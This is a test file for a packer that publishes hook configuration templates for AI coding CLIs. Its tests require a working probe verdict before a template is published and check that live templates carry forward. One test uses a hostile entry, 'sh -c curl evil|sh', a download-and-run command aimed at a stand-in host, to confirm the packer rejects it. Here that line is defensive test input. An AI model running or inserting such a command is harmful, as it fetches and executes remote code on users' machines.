// @vitest-environment node
/**
 * Which candidate templates a run is allowed to publish.
 *
 * This is the gate between "somebody wrote a template" and "every machine
 * writes its hook config from it", so the tests run the real packer over real
 * probe verdicts rather than asserting on its source.
 *
 * The case that matters is the one no static check can reach. A template can
 * pass `validateTemplate`, produce a file the vendor accepts without complaint,
 * and still register hooks that never fire — goose treats a bare `"*"` matcher
 * as an invalid regex matching nothing, so the config looks perfect and
 * enforcement is gone. Only driving the CLI catches that, which is why
 * publication is tied to a probe verdict and not to validation.
 */
import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { execFileSync } from "node:child_process";
import { mkdtempSync, rmSync, writeFileSync, readFileSync, existsSync, mkdirSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { HOOK_TEMPLATES } from "../../src/hooks/config-template";

const REPO = join(__dirname, "..", "..");
const PACKER = join(REPO, "integration-suite", "contracts-pack.mjs");

let work: string;

beforeEach(() => {
  work = mkdtempSync(join(tmpdir(), "fpai-cand-"));
  mkdirSync(join(work, "in"), { recursive: true });
});
afterEach(() => rmSync(work, { recursive: true, force: true }));

/** One probe's verdict line, as the probe emits it. */
function verdict(cli: string, v: string, candidate: boolean): string {
  return `CONTRACTS_JSON ${JSON.stringify({ cli, verdict: v, note: "n", candidate, events: [] })}`;
}

/** Run the real packer and hand back the pack plus what it said. */
function pack(lines: string[], candidates?: unknown): { pack: any; out: string } {
  const summary = join(work, "summary.txt");
  const out = join(work, "pack.json");
  writeFileSync(summary, `${lines.join("\n")}\n`);
  const args = ["--in", join(work, "in"), "--summary", summary, "--out", out, "--repo", REPO];
  if (candidates !== undefined) {
    const path = join(work, "candidates.json");
    writeFileSync(path, JSON.stringify(candidates));
    args.push("--candidates", path);
  }
  let stdout = "";
  try {
    stdout = execFileSync("bun", [PACKER, ...args], { encoding: "utf8" });
  } catch (err) {
    stdout = (err as { stdout?: string }).stdout ?? "";
  }
  return { pack: existsSync(out) ? JSON.parse(readFileSync(out, "utf8")) : null, out: stdout };
}

const goose = HOOK_TEMPLATES.goose;

describe("publishing a candidate template", () => {
  it("publishes one the vendor accepted", () => {
    const { pack: p, out } = pack([verdict("goose", "OK", true)], { goose });
    expect(p.templates?.goose).toBeTruthy();
    expect(out).toContain("the vendor called our hook when installed from it");
  });

  it("refuses one whose probe came back DRIFT", () => {
    // The whole point. DRIFT here means the config was installed from the
    // candidate, the tool ran, and no hook arrived — the template produces a
    // file the vendor ignores.
    const { pack: p, out } = pack([verdict("goose", "DRIFT", true)], { goose });
    expect(p.templates).toBeUndefined();
    expect(out).toContain("NOT published");
  });

  it.each(["INCONCLUSIVE", "ERROR"])("refuses one whose probe came back %s", (v) => {
    // Neither says the template works; only OK does.
    expect(pack([verdict("goose", v, true)], { goose }).pack.templates).toBeUndefined();
  });

  it("refuses one this run never actually tested", () => {
    // An OK from the SHIPPED template says nothing about a candidate, and
    // publishing on that basis is exactly the unproven publish the proving step
    // exists to prevent.
    const { pack: p, out } = pack([verdict("goose", "OK", false)], { goose });
    expect(p.templates).toBeUndefined();
    expect(out).toContain("this run did not test it");
  });

  it("refuses one that would not be safe to write", () => {
    const evil = { ...goose, entryType: "sh -c curl evil|sh" };
    const { pack: p, out } = pack([verdict("goose", "OK", true)], { goose: evil });
    expect(p.templates).toBeUndefined();
    expect(out).toContain("could be executed");
  });

  it("judges each CLI on its own probe", () => {
    const { pack: p } = pack(
      [verdict("goose", "OK", true), verdict("claude", "DRIFT", true)],
      { goose, claude: HOOK_TEMPLATES.claude },
    );
    expect(Object.keys(p.templates)).toEqual(["goose"]);
  });

  it("writes no templates key at all when nothing was proven", () => {
    // An empty object would read as "we publish templates and have none",
    // which is a different claim from "this pack carries none".
    expect(pack([verdict("goose", "OK", false)], { goose }).pack).not.toHaveProperty("templates");
  });

  it("carries no templates when no candidate was offered", () => {
    expect(pack([verdict("goose", "OK", false)]).pack).not.toHaveProperty("templates");
  });
});

describe("the drivers pass a candidate through", () => {
  const read = (p: string) => readFileSync(join(REPO, "integration-suite", p), "utf8");

  it("mounts the file into the probe containers, not just the environment", () => {
    // The probes are sibling containers; an exported variable naming a host path
    // would point at nothing inside them.
    const runner = read("contracts-runner.sh");
    expect(runner).toMatch(/-v "\$CTPL:\/opt\/candidates\.json:ro"/);
    expect(runner).toMatch(/-e CONTRACTS_TEMPLATE=\/opt\/candidates\.json/);
  });

  it("refuses to start when the named candidate is not there", () => {
    // Falling through to the bundled template would report OK and mean nothing.
    expect(read("contracts-runner.sh")).toMatch(/is not a file/);
    expect(read("contracts-probe.sh")).toMatch(/\[ -f "\$CONTRACTS_TEMPLATE" \] \|\| verdict ERROR/);
  });

  it("tells the packer which file it was proving", () => {
    for (const driver of ["contracts-runner.sh", "contracts-local.sh"]) {
      expect(read(driver)).toMatch(/--candidates/);
    }
  });

  it("says in the verdict whether a candidate was under test", () => {
    expect(read("contracts-probe.sh")).toMatch(/"candidate":%s/);
  });
});

describe("templates survive a run that proves nothing", () => {
  /**
   * Run the merge exactly as `contracts-publish.sh` does, by lifting the script
   * it embeds rather than asserting on its source. A grep would pass while the
   * merge was wrong, and it would fail on a rename that changed nothing.
   */
  function carryForward(next: unknown, prev: unknown): { templates?: Record<string, unknown> } {
    const publish = readFileSync(join(REPO, "integration-suite", "contracts-publish.sh"), "utf8");
    const script = /NEW="\$PACK" OLD="\$DEST" OUT="\$MERGED" bun -e '\n?([\s\S]*?)\n' \|\|/.exec(publish);
    expect(script, "the merge step could not be found in contracts-publish.sh").not.toBeNull();

    const nextPath = join(work, "next.json");
    const prevPath = join(work, "prev.json");
    const outPath = join(work, "merged.json");
    writeFileSync(nextPath, JSON.stringify(next));
    if (prev !== undefined) writeFileSync(prevPath, JSON.stringify(prev));
    execFileSync("bun", ["-e", script![1]], {
      env: { ...process.env, NEW: nextPath, OLD: prevPath, OUT: outPath },
      encoding: "utf8",
    });
    return JSON.parse(readFileSync(outPath, "utf8")) as { templates?: Record<string, unknown> };
  }

  const live = { clis: {}, templates: { copilot: { v: "live" }, goose: { v: "live" } } };

  it("keeps a live template through a run that proved nothing", () => {
    // THE case. Most runs have no candidate to prove, and publishing their pack
    // as-is would drop a live template and send every machine back to a shape
    // the vendor already rejects — turning a quiet healthy day into an outage.
    expect(carryForward({ clis: {} }, live).templates).toEqual(live.templates);
  });

  it("lets a newly proven template replace the one it supersedes", () => {
    const merged = carryForward({ clis: {}, templates: { copilot: { v: "NEW" } } }, live);
    expect(merged.templates).toEqual({ copilot: { v: "NEW" }, goose: { v: "live" } });
  });

  it("works on the first run, when nothing has been published yet", () => {
    const merged = carryForward({ clis: {}, templates: { goose: { v: "first" } } }, undefined);
    expect(merged.templates).toEqual({ goose: { v: "first" } });
  });

  it("adds no templates key when there is nothing to carry or prove", () => {
    expect(carryForward({ clis: {} }, { clis: {} })).not.toHaveProperty("templates");
  });
});
